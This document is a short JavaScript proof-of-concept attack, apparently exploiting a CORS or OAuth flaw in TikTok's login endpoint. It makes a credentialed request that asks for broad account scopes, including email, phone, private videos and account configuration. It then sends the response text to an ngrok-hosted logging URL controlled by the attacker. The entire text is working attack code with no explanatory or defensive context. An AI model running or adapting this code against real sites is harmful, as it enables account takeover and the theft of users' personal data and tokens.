var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic,user.info.email,comment.list,biz.account.email,user.account.configure,live.list,comment.list.manage,biz.account.phone,video.list.manage,bizpartner.item.info,video.list.no_watermark,bizpartner.user.info,biz.account.info,user.info.showcase,user.info.phone,video.list.private_ads.no_watermark&aid=1459&source=web&redirect_uri=https://ads.tiktok.com/i18n/log/?_extra=cGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZmcm9tX3BhZ2U9bG9naW4mb3JpZ2luPWh0dHBzOi8vYWRzLnRpa3Rvay5jb20vaTE4bi9sb2dpbi8.&amp%3BerrCode=6007062&amp%3Berror=access_denied&amp%3Berror_string=access_denied&amp%3Blog_id=202307311046391DCAFBFD59DA91058E95&amp%3Blog_id=202307311048504D96B9115A384E05BC61&amp%3Bredirect=https%25253A%25252F%25252Fbusiness.tiktok.com%25252Fselect%25253Fsource%25253DBC_home%252526attr_source%25253DBC_home%252526redirect_from%25253Dlogin&amp%3Bregister_type=1&amp%3Bstate=a339872cdaf17815c5828988d4f67847622a988e&state=a339872cdaf17815c5828988d4f67847622a988e");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
